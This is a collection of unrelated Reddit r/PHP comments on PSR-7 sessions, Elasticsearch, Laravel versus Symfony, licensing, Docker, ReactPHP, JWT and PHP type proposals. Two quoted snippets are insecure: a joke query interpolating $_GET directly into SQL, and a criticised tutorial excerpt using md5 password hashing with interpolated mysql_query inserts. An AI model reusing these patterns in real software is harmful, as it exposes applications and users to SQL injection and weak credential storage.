As already mentioned on zeh twitschers: I don't really like using `ext-session` for anything PSR-7 related, as it basically breaks the functional and stateless nature of most PSR-7 middlewares, making them only suitable for the PHP WEB SAPI. While app-servers are still emerging, they will become more relevant as their stability improves (the performance is already amazing, btw), and using `ext-session` is basically a no-go due to its "global scope" base design. Therefore, while it may not be suited for everyone, I prefer storing the user identifier directly on the user's machine with a signed token, and have a "functionally pure" (or almost) approach to session management inside a PSR-7 dispatch cycle. Yes, that's a pitch for my own lib, but I think it's worth moving away from `ext-session` if you only need storing a user identifier and some CSRF tokens in your session. Ref: https://github.com/Ocramius/PSR7Session
could you please exemplify in your code bases? i looked into your repositories but i couldn't see.
I don't think that I have public application repos, mostly libraries. I wanted to do that for my `example` dir in some of those libs, but it would add a bit of noise and distract from the actual code example. In an expressive app, this is what I currently have, for example: &lt;?php call_user_func(function () { // Delegate static file requests back to the PHP built-in webserver if (php_sapi_name() === 'cli-server' &amp;&amp; is_file(__DIR__ . parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH)) ) { return false; } chdir(dirname(__DIR__)); require __DIR__ . '/../vendor/autoload.php'; /* @var \Interop\Container\ContainerInterface $container */ $container = require __DIR__ . '/../config/container.php'; /* @var \Zend\Expressive\Application $app */ $app = $container-&gt;get(\Zend\Expressive\Application::class); $app-&gt;run(); });
Yes, it was a joke about this breaking code
&gt; Does that make sense? Is what I'm saying there the biggest point of difference in the libraries? Yep, pretty much! The code is obviously a bit different internally, but the major difference is mostly in the API (with ES-PHP being essentially "json in PHP"). &gt; Any thoughts on the index/type layout stuff I mentioned in this thread? The responses in that thread sound good to me. In addition to what was mentioned, you might checkout [Parent/Child relationships](https://www.elastic.co/guide/en/elasticsearch/guide/current/parent-child.html) too. They let you assign multiple children-per-parent, and gives you a few basic relational tools (e.g. `has_child` query, which finds all parents who have a child matching X, or `has_parent` which finds all children who have a parent matching Y, etc). The points about documents being immutable are valid. Both because of the reindexing cost as well as the write contention if multiple people are trying to reply to the thread at the same time. It may work for a small forum (and if you know it's going to stay small, like an internal forum) it may well be the simplest/easiest/fastest approach though. If you index comments in isolation, you can request `2n` documents instead of `n` and do thread-level grouping in your app. This is probably what i'd do, it gives you the most flexibility.
`phpcbf` is a great tool. One Shift is modeled from. However, it's important to note it does not resolve every PSR-2 violation. The [PHP PSR-2 Shift](https://php-shift.com/upgrade-psr2-code-style-standard) does far more.
Cool thanks, I'll take a look into the parent/child features. Sounds like it would be good for this, as I will probably be storing the number of "likes" for each comment in ES too, so that means updating more often.
What's easier to backup, manage and tune? - A 10MB Postgresql database with a terabyte of flat files - A one terabyte database The answer is overwhelmingly the first of these. 
That initial glue can be condensed down to a single variable if you care that much. But considering static classes and super globals exist, worrying about a handful of globally scoped bootstrap variables is worrying about the wrong thing IMO. Senior: "HAHA! you can't access `$app` anymore! Junior: "SELECT * FROM users WHERE id = {$_GET['user_id']}" 🖕
35 minutes and already a downvote? Reddit, you confuse me. I'm grasping at straws here and just trying to get some help.
Probably because you should have asked in /r/phphelp
Yeah we use PHPUnit and Codeception for automated testing which we run daily during heavy periods of development on any given application. We are also constantly staying up-to-date with CI version and PHP releases and upgrade procedures to stay on top of any changes that need to be made due to a PHP version upgrade. 
Congrats due. Good work, and good to see jarves releasing alpha. I have a question / concern. Does having a dependency on dev make it alpha ? I am looking at the propel bundle and propel itself https://github.com/jarves/jarves/blob/1b356d7f639aa7e965b3b112795ff1b17ebd1ad4/composer.json#L38-L39 . May be those needs to be tagged alpha first ?
Probably no once can answer your question. Ask your self a question : "What is easy to understand and use?" . Symfony2 is a set of reusable components. Use its components or use the framework itself. Some part of Laravel are also based on Symfony. So either way you will learn a bit of symfony components I guess :) .
Thanks for the answer. I also looke for pimpmylog, and I'm wondering if I could use it or not. If I'm not mistaken it's an open source app which pretty much does what I want, so I may be able to change some things on it. Anyway, I'll also look for what you said, thanks again :)
Thanks :)
Something about this style reminds me of Blackberry. Now I feel dirty.
Basically whenever speed to market is a factor I use Laravel. Its opinionated compared to symfony so its just faster to develop on. For me this is pretty much all the time. I always need to build things quickly. And any benefit symfony might have in regards to scale of your application can be easily solved in laravel with simple architecture choices. The trend towards microservices also favours laravel + lumen over Symfony + silex in my opinion. You don't need as much fine-grained control over the hundreds of components in your application when you are building things using many small microservices. I see two ideal use cases for symfony. One being large applications that need to be supported by many developers for many many years. Its component based nature gives you much more control over the overall architecture. Both during initial development and also when you have to switch components in and out over years of maintenance. The other use case is if you have a product which will be off the shelf. With symfony you can pick and choose what parts of it to include in your application, which is perfect if you have to bundle it up and distribute it. Laravel is pretty light weight but it still tends to include a lot of stuff you may never use. 
for your timeline ... i think if i'd do it i probably would be able to do it in less than 5 days, maybe less than 2 days ... so i think its very feasible to learn enough php to do that in 8 weeks. this is based on the assumption that this is a "gui-less app" i.e. you generate data either as a csv or database that somebody looks at, i personally would probably generate 1 api endpoint that exposes a csv or xml field that can be directly imported into google spreadsheet or excel as most people likely will prefer to work with your results in spreadsheets. 
What you're doing is good for learning purposes and this comment is not trying to push you down but you'll see that docker-compose will make your life a lot easier and it's really not hard to learn at all. Doing a quick search in Github I noticed that there are a lot of [docker lemp stacks](https://github.com/search?q=docker+lemp) and most of them don't have separate containers for each component(php+nginx+mariadb/mysql). Personally I use a modified version of [this one](https://github.com/Yanisky/docker-nginx-php-mysql) which has all elements separated in different containers, it's a good start.
Does the CRUD framework support one-to-many and many-to-many relations? An example, or doc page would be helpful.
Thanks for this. I did check it out yesterday and it does look super simple to use. Currently docker-compose freezes up on my mac so I want to fix that and as soon as I get the components working, I will document it again. I want to make using my docker-compose files as easy as possible and that may include adding in variables so users can literally just swap it out as needed. Thank you so much for your help on this and I appreciated the support you've given me so far. :D
[removed]
Is there anything specific you feel would be disallowed under this license?
It would have made sense it if was 1$ per month, until user adds more features.. 
Thank you
link is broken
Not yet, but it's the plan. Any helping hand?
There have been several MySQLi Shifts. It is very thorough with converting the functions, constants, and parameter differences. The manual part is the MySQLi requirement of the *resource link* parameter. As this was optional in MySQL it was rarely used. So even though the MySQLi Shift adds the parameter, you may need to resolve some variable scope issues depending on your code. However, this would be an issue without the Shift as well.
It's important to note when comparing *support* that Laravel 5.1 offers [Long Term Support](https://laravel.com/docs/5.1/releases#support-policy) (LTS). In addition, Laravel is mostly built with Symphony underneath.
LTS is one thing, but I rather meant [this](https://sensiolabs.com/en/enterprise-subscription/symfony-support.html) or [that](https://sensiolabs.com/en/professional-services/index.html) - business solutions.
It's mostly personal preference but the way I think about it is that Laravel has a lot of things that can restrict a larger project due to how opinionated it is. So if you think you're going to end up hitting one of those walls you're better off going with Symfony. There is also the fact that Symfony takes a lot more time to setup when compared to Laravel ( Doctrine entities, config files ) so if you want to get up and running fast Laravel almost always wins there. The company I work for has adopted Symfony due to the projects we work on being large enough that Laravel would get in the way. This is all personal preference however and others will feel differently.
I tend to prefer packages with the MIT license over others. 
So you have 150 employees? The money isn't so much the thing being the issue (although it is obviously a massive help), it's the lack of people behind the project. If god forbid something happened to yourself, where does that leave Laravel? It's all well and good making the assumption that the 'community would take it on' but that's proven time and time again with so many open-source projects to simply not be the case at all. 
Link your repo !
I think it is similar. In my area, it is mostly small shops that use Laravel, and the only larger PHP places I've seen use Symfony.
Thanks for the feedback!
GPL is fine, and you can publish software under as many public licenses as you want and let people choose which one works best for them. There are valid reasons that people can personally dislike GPL but a lot of successful open source projects use it for very good reasons.
Guys, did you not notice? **March 31, 2016** $upass = md5(mysql_real_escape_string($_POST['pass'])); mysql_query("INSERT INTO users(username,email,password) VALUES('$uname','$email','$upass')") I'm pretty sure its an April fools joke. (I hope)
Because to avoid a host of horrible environment-dependent issues you always need to have your dev environment as close as possible as production, this includes the underlying OS (including the exact same distro and packages that will be running your app) and infrastructure. 
Docker is coming up on popularity, among many reasons, because it does away with many environment requirements which are rooted at the OS level and instead you can concentrate with packaging just your app and the exact runtime required to make it work.
I agree entirely. 
it's really easy with a few step configurations.
&gt; Looking at Symfony I can use the 2.8 documentation for most 3.0 features That might be true but if memory serves it wasn't that easy migrating from Symfony to Symfony2. Although someone may correct me on that. Frameworks have to go through a breaking change every now and then. And the first one happens early on, when the initial architecture decisions are revised. Laravel is still relatively young. I don't mind that it has gone through its big change. I believe that means its going to be stable for quite some time. 
I'm confused at the code provided. /* * Password was generated by password_hash(), so we need to use * password_verify() to check it. * * @see http://php.net/manual/en/ref.password.php */ yet, you're not using it, because you've checked the password against md5 hash earlier. $secretKey = base64_decode(SECRET_KEY); Yet your secret key is defined as a plain text, not base64 data.
SECRET_KEY would be any random string which you want base64 or anything else but you need to pass same key on token encoding and decoding and regarding password just password_verify() comments are bit misleading because I am saving password as md5 so for making login I have used md5 . Thanks for pointing me for password_verify() functions 
&gt; /* &gt; * Password was generated by password_hash(), so we need to use &gt; * password_verify() to check it. &gt; * &gt; * @see http://php.net/manual/en/ref.password.php &gt; */ I have just removed above comments
wow, their website is terrible
I sure hope this is an April fools. - It's not step-by-step. It's just chunks of code dumped into the article without proper explanations of what really goes on. - The code is riddled with anti-patterns and bad practices. `die`? Really? - Insufficient escaping of database variables (use PDO, MySQLi, or other interfaces with prepared statements). I'm sure the author has noble intentions and I don't like sounding like an old fart. But this code is 15 years old and **should not being taught** to up-and-coming programmers. At least not without clear warning that this is not sufficient compared to today's standards and practices.
Thanks for the feedback. The website wasn't our priority for now, but we will be putting out a new one soon. 
Benchmarking anything is deceiving. - Was the benchmark run on Linux, Windows, OSX, FreeBSD, etc.? - What kind of hardware? - How fully-featured is Peachpie? If things are still missing what kind impact does that have on performance? - etc, etc.
Great point, thanks! We included the test configuration in the last benchmark, but we just edited it into this recent one as well, thanks for the remark. As far as the features are concerned and what is missing, please refer to the roadmap on our GitHub. Otherwise, the missing features do not have an impact on this particular microbenchmark. 
Thanks! I am going to give this a try for some legacy code I need to move over to 7.
A lot of these things (generators, null coalesce operators, type-hinting returns) are pretty common in other languages, and for good reason, they are really useful. I don't think we should limit progress simply because it might scare away inexperienced developers. This sounds like laziness to me. 
From the sidebar: &gt; /r/PHP is not a support subreddit. Please visit /r/phphelp for help, or connect to [##php on Freenode IRC](http://webchat.freenode.net/?channels=%23%23php) ([nickserv registration required](https://freenode.net/faq.shtml#nicksetup)). &gt; You may also join us on at [#phpmentoring on Freenode IRC](http://webchat.freenode.net/?channels=%23phpmentoring) for community and mentoring discussions. Also see the [Subreddit FAQ](https://www.reddit.com/r/PHP/wiki/index).
Can I still post library in it's own post as it's quite big, can be useful (i hope) and i don't want it to be missed in bulk topic?
Personally I think Symfony is a lot more mature than Laravel and they have proven themself for lot's of years already when it comes to stability and support. Also their deprecation policy is really amazin while I've seen cases where Laravel simply changed backwards compatiblity in minor versions because "Laravel doesn't do semver!". I don't think Laravel is actually bad but I feel Symfony is just more enterprise ready and it feels much more sophisticated. I dislike the fact that Laravel is a one man show where Symfony has tons of contributors, also outside SensioLabs. To add one more thing: the fact that the owner of Laravel has to come to reddit and defend itself against some arguments on his own kinda shows the difference between Laravel as a one man show and Symfony as a fully community supported framework.
While you consider Cloudinary and Imgix, I would also suggest taking a look at [Filestack](https://www.filestack.com/). Filestack offers similar URL transformations to Cloudinary, but also allows you to connect to your S3 bucket (or a few other kinds of storage) as long as you’re on a paid plan. That way you can automate S3 storage of your images while still having the variety you’re getting with Cloudinary or Imgix. Not sure if it’s relevant to your project, but Filestack also includes an upload widget that connects to 20+ cloud sources (which is available even on the limited free plan.) To answer your 3 questions, no Filestack doesn’t allow you to create custom transformations, although that does look useful. The upload widget would act as a client side uploading feature, but because the transformations are URL based you can also perform them on images not uploaded through the widget and, sorry I don’t think the kind of automatic image enhancement you’re looking for is a Filestack conversion but you can set minimums that will force the user to choose a different file if the photo they choose to upload isn’t a high enough resolution. Not sure if that would help. Full Disclosure: Filestack pays my bills (well, some of them), but when I saw you debating Cloudinary vs. S3 I thought it worth mentioning that with Filestack you can do both.
I think this was the wrong fix to make.
Interesting concept. Similar to what people are doing with NodeJS, but with PHP! It's of course risky territory trying to roll your own web server, but it looks like a fun thing to try for any experimental project.
There hasn't been a new version of ReactPHP in 2 years - isn't it more or less "dead" after such a long time? Especially after all the changes to PHP in that timeframe (to frameworks, PHP versions like PHP 5.6 and PHP7, etc.)
I'm not sure what you base the project activity on, because I can see quite a lot going on: * last commit on [event-loop](https://github.com/reactphp/event-loop) a month ago * last commit on [http](https://github.com/reactphp/http) 4 months ago, with big features added (e.g file upload last summer) * [socket](https://github.com/reactphp/socket) a month ago * [stream](https://github.com/reactphp/stream) 23 days ago * [promise](https://github.com/reactphp/promise) 13 days ago And so on.
The resemblance is troubling... Could it be a coincidence? ;) See Igor's slides when he introduced NodePHP (errr ReactPHP) back in 2012: https://speakerdeck.com/igorw/react-phpnw Just like for NodeJs, you'd actually hide your server behind a load balancer like nginx, and use supervisord to restart failing ones. More on this topic in the next article! People are using React in production, some even report year long uptime. Check ReactPHP twitter account to see testimony: https://twitter.com/reactphp
They might have some tools if you sign up for their affiliate program.
Eh, file extensions are pretty loose as a 'standard'. Even some of the 'standards' mean very little, like .txt or .conf, and of course many files on most *nix systems don't even have an extension.
&gt; not a single WTF in 7 years? I'm not buying it... you caught me 
April 19th.
*^(Note, continues on next message: http://news.php.net/php.internals/92253)* Just saw this on the PHP Internals mailing list. Really exciting to see /u/morrisonlevi put forth a proposal like this. I'd love to see union types, specifically.
$99 on day of release. 😀 
There is absolutely nothing wrong with using the GPL and you shouldn't let anyone shame you for using it.
ye faker is amazing, especially with nelmio/alice :)
What a helpful and insightful comment!
i dont understand what it does, is it a syntax highlighter that i embed into a website kind of thing? or is it a syntax highlighter to use if i edit code in vim?
you called it "dead" though. The activity shows that its not dead.
Amazing! I love it! Will we be able to install it into existing projects?
It is not really designed to work that way but you can give it a shot if you want.
For example it would never be included into Symfony or Laravel core because it would force the framework to become GPL too. Also it doesn't allow companies to build software with it (and distribute it) without giving customers access to the source of the entire application. MIT, which both Symfony and Laravel use, is much more flexible. It basically allows people to do what they want. The Mozilla Public License (MPL) is slightly between the two. If you change any of the source you have made, it must be made available. But it allows for the project to be used in a "larger work" without having to make the source of the larger work available. 
In the time it took you to write this out, you could have simply placed the redirect at the bottom and tested it out to see what happens. PHP executes synchronously. As long as no headers are sent before the redirect - meaning you're not echoing anything, outputting markup, etc. - then all code before the header redirect will execute first and then the redirect will occur.
This is incorrect: ` The tokens themselves are encrypted and authenticated` JWT tokens are **encoded** not **encrypted**. Anybody can view the data encoded in the JWT token, but the sender and recipients should be the only ones that are able to verify it with the shared secret key.
Looks good! Nice to see a library using all of the PHP 7 features. It seems like the code could be simpler if you removed the error middleware and let the user handler errors with a regular middleware interface like [this](https://github.com/relayphp/Relay.Middleware/blob/1.x/src/ExceptionHandler.php). Existing middleware like the [whoops middleware](https://github.com/franzliedke/whoops-middleware) already works with the standard interface.
In your case you might not need it. When it makes sense: - Being able to setup all of the developers on the team with the same setup regardless of the OS they run. It's easier to write a provisioning script for one machine (or just reuse the production scripts) than write instructions for 3 OSs. - Not wasting time dealing with "works on my machine" differences between dev and production. - When you have redis, elastic search, mysql, nginx, ssl, logs, supervisord, and whatever else on production, it ends up being easier to just use virtualbox than to set all of that up on your laptop. That being said, I still run unit tests on my local machine and will use php -S a lot instead of vagrant. Vagrant can be slower, and has issues of it's own that you will waste time debugging.
I move with the times; but the more automation I put in my process the more I feel out of control. I know some of these things are meant to speed production - but they depend on so many other moving parts. I see projects start off on these massive frameworks and spend a bunch of time getting it all working for simple apps. Maybe it is because I write business apps usually for lump sum that never see massive use and are highly catered to the clients needs. A light PHP framework, a BS3 theme, sprinkle in some well maintained JS libraries and call it a day. Guess that works for me - I dont care if it is cutting edge, just that I can support and maintain it until the client changes their mind and has me re-write the thing again.
Wait, I can force primitive types in functions? I've done so for callable and classes, but can I restrict it to string or int or bool as well? 
Scalar type declarations were added in PHP 7.0. You can [start here](http://php.net/manual/en/migration70.new-features.php#migration70.new-features.scalar-type-declarations) and follow the links to read the full documentation.
Apparently yes: &gt; Every token is placed inside it's own `span` so it can be easily styled with css.
This sounds awesome! One more thing that would be nice is to type hint ClassX[] arrays or something similar.
I thank you dearly! This is great! Now if only I could find clients that use php 7...
You can embed it in website, or for example exception handler to highlight source with error - it will work in HTTP environment as well as in CLI. It just outputs source formatted in html/css or ANSI escape codes. But basically it's possible to implement every needed format. 
/u/utotwel Looks really nice! 2 questions about the subscriptions: - Are we able to change the duration of the subscription period to 6 monthly and yearly? - Will it support the sale of one-off products / add-ons also? Thanks!
Yes! I mean, first they would need to implement object types which allowed for ClassX[] and then they could implement type hinting for them. But there's no reason why it shouldn't exist. Although I guess you can just implement this yourself. ClassXArr extends ArrayObject or ClassXArr extends SplDoublyLinkedList depending on what you want to do. And then just implement ClassXArr to only accept ClassX objects. It's not as elegant, but when has anyone called PHP elegant :)
Thanks! Interesting idea about the error middleware. Never been entirely convinced it is needed, but wasn't sure about the easiest way to handle exceptions. The whoops middleware is interesting.
....Now meet the ugly memory management of PHP ;-)
just like the website!
Can someone ELI5 what middleware is? I feel like an idiot every time I try to understand; I'm sure I use them all the time without realising it, but... me no brain. :(
I want to do a small project, the features are: 1.- Login and registration system with encryption and user session control. 2.- Set different pages for administrators and users. 3.- If you are a user, you can only query "customer tables". 4.- If you are an admin, you can access the "administrator tools", where you can register new items, customers and stuff. You can also edit existing items (I.E: you sell clothing so you can set for "skirt1" the length to 22 and the color to yellow". 5.- I will implement AJAX for some features. Do you think is it worth it learning an easy framework like codeigniter for this or just use raw PHP? As you can see is a pretty simple project. 
Well duh, it's powered by Blogger. Of course it's terrible.
Btw, you don't get much performance improvements, because in your readme is &gt; ./vendor/bin/ppm start . --concurrent-requests=1 --port=5500 PPM has as default app-env=dev and debug=1, which makes it quit slow :) Try &gt; ./vendor/bin/ppm start . --concurrent-requests=1 --port=5500 --app-env=prod --debug=0 --logging=0 And you should get way better performance results
What I would recommend most is to test it in Blackfire - there you actually see where the application spends time, what functions are called often and what the result is. In PHP7 there was little difference between a classmap and not using a classmap in my application, with OpCache enabled and opcache.validate_timestamps set to zero. But it was still a little better with a classmap, even it was max. 1ms. With the new optimization, classmaps should be a clear winner - no additional memory usage for the classmap and no parsing, so I don't see how it actually can be slower than PSR-4 autoloading, because PHP only has to access a shared array without doing any work, and you save a lot of file_exists and other function calls to find out where and how to load a class. If you still find out your application is slower with a classmap &amp; with this new composer feature, then there is probably something wrong somewhere - either with composer, or you are using an old PHP version, or maybe something else.
As /u/CheckeredMichael said, it's $99, and you can use that license for as many internal sites as you like, for testing out different ideas or development. You just need a single license per public site. So if you buy a license, build ten ideas and launch one of them, you're covered, if you then want to launch a second one of those ideas, you just have to buy an extra license. 
Two tips on database design: 1. SQL is a declarative language. What you write is what you want the RDBMS to give you, and it uses algorithms and statistics to figure out the best way to give it to you. Therefore, being functionally complete is often an initial step, not the final one. To make an RDBMS perform well, you need to take into account all sorts of factors relating to the data. That being said, I doubt v1 of your app will require tuning to the Nth degree. Just know that as usage scales up, new problems will emerge. 2. Probably the most basic piece of the RDBMS puzzle is the idea of data normalization. It's a fancy term for designing tables so that related information is stored in a way that generally avoids redundancy. For example, you would naturally not store all of the child's basic info (name, age, gender) with each blog update. You'd have that in a "child" or "recipient" table, with some sort of unique identifier (the primary key), and then the "blog_entry" table (or whatever you want to call it) has a reference to that table (a foreign key). In other words, blogEntry.childId refers to child.Id (or something like that). The most important two things to understand about normalization are that no one pattern is perfect for all use cases and that "de-normalization" - deliberately not normalizing everything everywhere - is not a bad thing. A rookie mistake is to apply normalization rules rigorously and without exception, thinking that you've designed the perfect data model, only to manage to create something that is unwieldy and too abstracted to be effective. So, go Google normalization, figure out an initial design, pick an RDBMS (Postgresql is my open source preference, but I get paid to develop on SQL Server), and know that you'll be learning as you go. Have fun!
&gt; I see projects start off on these massive frameworks and spend a bunch of time getting it all working for simple apps. [...] A light PHP framework, a BS3 theme, sprinkle in some well maintained JS libraries and call it a day. I'm assuming you've not actually used Laravel? While there are many arguments to be made for where it's the right choice, initial set up really isn't one of them. Run `laravel new cool-thing` or `composer create-project --prefer-dist laravel/laravel cool-thing`. Define a route, create a single controller with a single method, drop Bootstrap in your public folder, create a view template that's called from your controller method. Done. There's no requirement to use any task runners and if you have no need for any additional PHP packages, you never have to worry about composer's dependency management (except that if you run `composer update` it will happily apply security patches for you). It's fair enough if your process works for you, but keeping all those apps patched against security vulnerabilities in the framework is surely painful if you're just grabbing an archive of the framework? 
I asked if it was not more or less dead after 2 years without a new release - and it seems it is not dead. But their website does suggest nothing is going on, because they link to an outdated release, their example uses an even more outdated version, and nowhere does it say how the project is doing or what is planned, and their meta-package has not had a release in 1.5 years. So even if Github registers activity, it is not obvious or really visible for anybody interested in reactPHP.
I completely agree with /u/jarofgreen. Sounds like a cool project but you don't seem very ready or suited for it. The organization would probably be better off going with someone who can deliver a product in a timely manner and who has the knowledge to fix bugs as they come up.
Read about MVC and relational databases. However, I believe it's more complicated than you think because you will need to figure out on your own how those java/google apps services work and you'll need write code to consume the services and maybe cache them if they are too slow. "Grades and stuff" are not going to be very simple data objects it seems like. It also needs a lot of thinking how you will display such data. Blog updates - find out who is the end user making the updates and make sure they actually need what you are making and make sure they are going to use it. You will need to be in touch with those people on weekly basis It is smart idea to add notifications/newsletters for "donor zone" users so they would come and visit more frequently and send more money. You'll probably need to become the system admin too. Good luck!
This probably isn't going to be extremely helpful, but have you considered moving away from static methods? One of the downsides you see in the Crypto class is that it forces you into late exception handling. With a regular object you could execute the runtime tests once during instantiation and discover if the system was unable to provide safe cryptographic functions early. With the static methods you'll only find out when you reach the point of trying to encrypt or decrypt something.
 $a['movies'] = array(); // inside your loop $a['movies'][] = array("movie" =&gt; $title, "year" =&gt; $year);
Glad you got the question answered, but for future reference the sidebar calls this out: &gt; /r/PHP is not a support subreddit. Please visit /r/phphelp for help, or connect to ##php on Freenode IRC (nickserv registration required).
So to review * Doesn't know about structuring a database, and has not asked to see what exists, ask questions about design choices * Thinks reddit would be ideal vs taking courses, reading books, asking for support from the non-profit who have domain knowledge * wants to replace a Java (so I'm thinking large scale, possibly enterprise, most-likely well tested) app with some bits of PHP just for a portfolio piece... * Thinks people from the developing world are less valuable and deserve less protection for rights such as data-protection; also believes they all live in dwellings described as "mudhouses" * Usually does layouts and basic UI at a Junior level, but wants to comment on an established application, choice of technologies, even information design (FYI this is a job for marketing &amp; comms, systems architecture, consulting) * Not in line with ethos, or mission of business, thinks sponsored adoption is "weird" I'm really struggling to see why anyone should help you; I'm personally hoping you are very young or that the owner of the business hears you and runs a mile! In the case that you do care, care enough to say "Sorry mum and dad; I'd love to help your friends, but after some thought it's going to be like a hike up Kilimanjaro, using only my tongue, whilst being chased by lions. I'm just learning design and while I have some reference mockups (present, will help your portfolio); I'm usually not running the whole show, and I'm not sure I can bring it to life on my own." That would be hell-a brave! I think everyone would like that you, rather than commenting on areas which largely seem to not matter to what should be your role, a domain and business none of us understand unless we work with. So go do that! 
Well... I think that union types is very dangerous idea. I have a few concerns that with union types the whole idea of type hinting will be broken. Developers will just add new types instead of thinking about polymorphic code. The main point of type hinting to me is to provide type information. With union types this information will be lost and only type checking in runtime remains. Nullable return type hinting is needed, but this could be done [like in C#](https://msdn.microsoft.com/en-us/library/1t3y8s4s.aspx): function findUser(int $id) : User? As for array and traversable case - this is problem in php itself. Why array can't just be traversable? This will solve many issues. And I don't see any other problems.
I feel similarly. Union types have some usefulness in places where you can't make your own superclass of two types (e.g. `array|Traversable`), but I fear they'd mostly be used for making a function do different things depending on the types of its arguments (e.g. `int|array`), and in those cases it would be cleaner to make a separate function instead. Union types are also a bit of a mess when weak typing comes up, and in some usages can defeat the type soundness that type checks are supposed to provide. Nullable types are a much simpler proposal with fewer problems.
You can do monthly and yearly right now but I should be able to support other periods pretty easily in a future release. Yes, you can do one-off purchases as well. The Spark store works this way and is built on Spark! :)
Thanks!
[It's been tried and it didn't succeed.](http://wiki.php.net/rfc/arrayof) And that was without the new conundrum of coercing scalars.
offtopic: logo reminds me of winamp offtopic2: i still use it :]
"with the new optimization"...which one? do yiu have a link?
To further that, in the case of the example given, the introduction of a number/numeric super scalar type hint would help.
I agree, documentation is definitely an issue here. I'll see if I can contribute
There are definitely issues with the type system, but I'm not liking this. 1. A real solution to array|Traversable is to make sure that an array can pass for Traversable. Better yet, make array a real object. 2. Like mythix_dnb stated earlier, proper method overloading would be a far better setup. 3. If you don't know what is going to come out of your method, don't type hint it. If you do type hint it, deliver what you promised or throw an exception. To me, a more important type hinting issue has to do with Interfaces and trying to define that the implementor needs to return itself. Interface foo { public function setX(): self; } You would think that the implementor could just declare a return type of "self" as well. Nope! It has to declare the the interface as the return type. Ack! Stepping down from the soap box... the point is that I think there's better places to address the type system than adding more confusion to the hinting.
Exceptions in __toString() should be permitted. 
That's exactly what I'm looking for I searched on Google but didn't find this ! Thank you, I hope they are not only allowing people with huge websites to get access to their API
[Hofstadter's Law: It always takes longer than you expect, even when you take into account Hofstadter's Law.](https://en.wikipedia.org/wiki/Hofstadter%27s_law)
Right now it's just Stripe and Braintree.
As much as I wish to see that, as hard it is to make this work. The main point about the fatal error is that is stops in the middle of the internal function, immediately. Exceptions would continue with a value like "" (empty string) and be only actually _thrown_ when the function returns. [from an internals perspective.]
Fix the stdlib function names so that people shut the fuck up about it. There's an [RFC in progress](https://wiki.php.net/rfc/consistent_function_names). Also, property getters/setters. Makes so much more sense than a single `__get` function that handles every property.
Yeah, i know. Read about it on http://phpsadness.com/sad/14. Still, it's something to improve at some point.
Thank you for your constructive reply. I do get your points and I'll definitely go and read on the topics you've mentioned.
I'm not planning on using the google apps services anymore. The number of children in the project is currently around 300 and the growth is very slow at the moment. "Grades and stuff" well maybe I'm oversimplifying this, because as I mentioned my knowledge about DB is very low. However, i think a simple grade table with columns for each subject will be enough and than i will simply create a relationship between child ID and the ID of the corresponding entry in the table grade. Anyway thanks for a constructive response :)
On JIRA's documentation this password changing endpoint is marked "EXPERIMENTAL" See: https://docs.atlassian.com/jira/REST/latest/#api/2/user-changeUserPassword Also the example on the documentation link has a `"password" : "new password"` key-value pair, instead of `"value":"new password"` Hopefully this helps!
Is the source code getting released with it so we can extend it? I know it's going to be paid but how do I add new features etc.
Is there any real chance of this passing?
That's a completely different issue. I value the energy you're putting into this, but the other guy was right. You need to weigh what's best for the organization and not what would be the most fun for you. 
Also you should protect your form against CSRF :)
http://stackoverflow.com/questions/3186725/how-can-i-get-the-error-message-for-the-mail-function You should be able to use error_get_last() to check for the error if mail() returns false.
You appear to have an extra parameter in your `mail` call. The third parameter is the message of the email it self, where you have the persons name in there? When you click the submit button, what happens, do you get the `Your e-mail...` message?
I hate Java for doing that.
I think using a custom built system might be too difficult. Probably better using a CMS and configuring it to your needs. Wordpress Drupal or even something like Airtable should work great as well.
The title of this discussion - http://blog.blackfire.io/speeding-up-autoloading-on-php-5-6-7-0-for-everyone.html ;-)
I think it's generally an issue with async PHP that there is not enough documentation yet and not too many real world examples (that I could find), which would pave the way for more general use - and maybe PHP itself would then also be modified to be more async compatible.
Fixing the function names &amp; also argument orders for some functions would be awesome. I have been programming in PHP for over 15 years, and some functions are just not named to be obvious or consistent, which leads to a lot of time spent with the manual sometimes. Scalar objects could also solve this, but fixing the function names too would be nice.
The fact that most of the standard library is written in C, which leads to horrors any time you need to introspect anything at all. I know much of it is done due to bindings to imported/shared C libraries and for performance, but it still leads to a lot of "WTF" moments.
Is that your library outputting the error that is now showing on your site?
&gt; Developers will just add new types instead of thinking about polymorphic code. I think you meant to say "inheritance based polymorphic code". Union types can very well be polymorphic. Polymorphism !== Inheritance. &gt; The main point of type hinting to me is to provide type information. With union types this information will be lost and only type checking in runtime remains. Please further explain how union types is losing type information.
&gt; Better yet, make array a real object. This will probably break over 50% of all PHP programs, even though I too wish it could be done. It is just way too large of a BC break. &gt; You would think that the implementor could just declare a return type of "self" as well. Nope! It has to declare the the interface as the return type. Ack! This is just because of a lack of covariance in return types. I expect it will happen some day. &gt; If you do type hint it, deliver what you promised or throw an exception. This is overly simplistic. Consider querying a database for a single record. What are the possible outcomes? - There is no matching record - There was a connection or other database error - There is a matching record Throwing an exception for that first point may be valid if it is expected to be there, but many times it's just a normal, routine thing to query for missing data. A return type that permits all three can encode this easily: function get_user(string $id): User | Error | Null; You can say the Error should be thrown; that's fair enough. But the part of encoding a User or Null remains. There are many places out there doing something like this already - they just can't solidify the type in the signature. You can alternatively say there should be a result class that encodes that information - that's fine but that's actually more work than the union types and no actual value has been gained by that work. Code still has to be written to determine which branch should be taken, and some branch can be skipped. This is exactly the same as union types, just hidden around more code.
I second this, I am so excited at this extension once it became available, now we need to do all we can to make PHP internals hear our voice so this will make it to the PHP core. I am actually writing an extension called 'scalar_classes' which will be a standard scalar object handler library written in C, but I think custom handlers aint bad idea after all. Maybe its better to provide both standard native handlers(C) while allowing customer handlers(PHP). 
Also, you may want to look into using something like Guzzle so you don't have to write raw curl calls yourself for REST API calls. http://docs.guzzlephp.org/en/latest/ 
